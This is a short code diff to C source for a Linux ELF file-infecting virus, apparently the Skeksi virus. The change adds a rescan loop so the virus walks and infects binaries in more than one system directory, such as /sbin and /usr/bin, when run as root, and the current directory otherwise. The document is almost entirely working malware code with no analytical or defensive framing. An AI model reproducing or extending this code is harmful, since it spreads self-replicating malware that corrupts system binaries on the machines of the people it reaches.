@@ -708,6 +708,7 @@ void do_main(struct bootstrap_data *bootstrap)
 	mode_t mode;
 	uint32_t rnum;
 	elfbin_t self, target;
+	int scan_count = DIR_COUNT;
 	int icount = 0;
 	int paddingSize;
 	/*
@@ -717,8 +718,11 @@ void do_main(struct bootstrap_data *bootstrap)
 	 */
 	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" };
 	char cwd[2] = {'.', '\0'};
+
+rescan:
 	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
-	
+	if (!_strcmp(dir, "."))
+		scan_count = 1;
 	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
 	
 	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0);
@@ -748,9 +752,8 @@ void do_main(struct bootstrap_data *bootstrap)
 		for (fcount = 0, bpos = 0; bpos < nread; bpos++) {
 			d = (struct linux_dirent64 *) (dbuf + bpos);
     			bpos += d->d_reclen - 1;
-			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) {
+			if (!_strcmp(d->d_name, VIRUS_LAUNCHER_NAME)) 
 				continue;
-			}
 			if (d->d_name[0] == '.')
 				continue;
 			if (check_criteria(fpath = full_path(d->d_name, dir, &heap)) < 0)
@@ -778,9 +781,15 @@ infect:
 		}
 		
 	}
+	if (--scan_count > 0) {
+		_close(dd);
+		goto rescan;
+	}
+
 	rnum = get_random_number(10);
 	if (rnum == LUCKY_NUMBER) 
 		display_skeksi();
+	
 }
 
 int _getuid(void)
